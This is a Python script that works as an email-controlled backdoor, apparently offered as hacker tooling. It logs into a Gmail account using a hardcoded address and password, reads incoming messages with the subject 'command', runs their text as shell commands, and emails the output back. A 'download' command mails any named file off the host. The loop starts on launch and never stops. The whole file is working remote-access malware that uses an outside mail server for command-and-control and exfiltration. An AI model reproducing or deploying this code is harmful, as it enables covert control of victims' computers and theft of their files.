import email
import imaplib
import subprocess
import os
import shlex
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


class Send:
    def __init__(self,from_email,to_email,password):
        self.msg = MIMEMultipart()
        self.fromEmail = from_email
        self.toEmail = to_email
        self.msg['From'] = self.fromEmail
        self.msg['To'] = self.toEmail
        self.passwd = password
        self.server = smtplib.SMTP('smtp.gmail.com', 587)
        self.server.starttls()
        self.server.login(self.fromEmail, self.passwd)

    def main_execution(self,content,subject=None,file=None,):
        self.msg['Subject'] = subject
        body = content
        self.msg.attach(MIMEText(body, 'plain'))
        if file:
            filename = file
            attachment =  open(file,"rb")
                

            attacher = MIMEBase('application', 'octet-stream')
            attacher.set_payload(attachment.read())

            encoders.encode_base64(attacher)
            attacher.add_header('Content-Disposition', f'attachment; filename= {filename}')
            self.msg.attach(attacher)
            text = self.msg.as_string()

        text = self.msg.as_string()
        self.server.sendmail(self.fromEmail, self.toEmail,text)
        self.server.quit()



class Read:
    #initializing modules and variables of imaplib
    def __init__(self,email,passwd):
        self.mail = imaplib.IMAP4_SSL("imap.gmail.com")
        self.email = email
        self.passwd = passwd
        self.mail.login(self.email, self.passwd)

    def main(self):
        message_list = []
        #Selecting from where to read the messages you can select whichever you like
        self.mail.select("inbox")
        status, data = self.mail.search(None,"ALL")
        mail_ids = []
        for blocks in data:
            mail_ids += blocks.split()
        for elements in mail_ids:
            status, data = self.mail.fetch(elements,"(RFC822)")
            for response_part in data:
                if isinstance(response_part,tuple):
                    message = email.message_from_bytes(response_part[1])
                    mail_time = message["date"]
                    mail_from = message["from"]
                    mail_subject = message["subject"]
                    if message.is_multipart():
                        mail_content = ''
                        for part in message.get_payload():
                            if part.get_content_type() == 'text/plain':
                                mail_content += part.get_payload()
                    else:
                        mail_content = message.get_payload()
                    mess = {"Date":mail_time,"From:":mail_from,"Subject":mail_subject,"Content":mail_content}
                    message_list.append(mess)
        return message_list       

class For_new_commands:
    def __init__(self):
        self.date_list = []
    def execution(self):
        read = Read("forkeylogger101@gmail.com","loggerkey101")
        content = read.main()
        for msgs in content:
            if msgs["Date"] not in self.date_list:
                self.date_list.append(msgs["Date"])
                if msgs["Subject"] == "command":
                    cmd = msgs["Content"]
                    return cmd

class cmd_process:
    def main_process(self,command):
        if command[:2] == "cd":
            path = command[3:].strip('\n')
            path = path.strip('\r')
            os.chdir(path)
            output = os.getcwd()
            output = "[+] Present Working Directory: " + output
        elif command[:2] == "ls":
            subprocess.check_output("dir", shell=True)
        else:
            output = subprocess.check_output(command, shell=True)
        return output

class cmd_sender:
    def send_execute(self):
        while True:
            send = Send("forkeylogger101@gmail.com","forkeylogger101@gmail.com","loggerkey101")
            new_command = command_checker.execution()
            subject = "command reply"
            if new_command:
                if new_command[:8] == "download":
                    file_name = str(new_command[9:]).strip("\n")
                    file_name = file_name.strip("\r")
                    file_path = file_name
                    send.main_execution("Downloaded File",subject,file_path)
                else:
                    executed_output = cmd_process().main_process(new_command)
                    if isinstance(executed_output, (bytes, bytearray)):
                        send.main_execution(executed_output.decode(), subject)
                    if isinstance(executed_output, str):
                        send.main_execution(executed_output, subject)

            else:
                continue


command_checker = For_new_commands()
cmd_sender().send_execute()

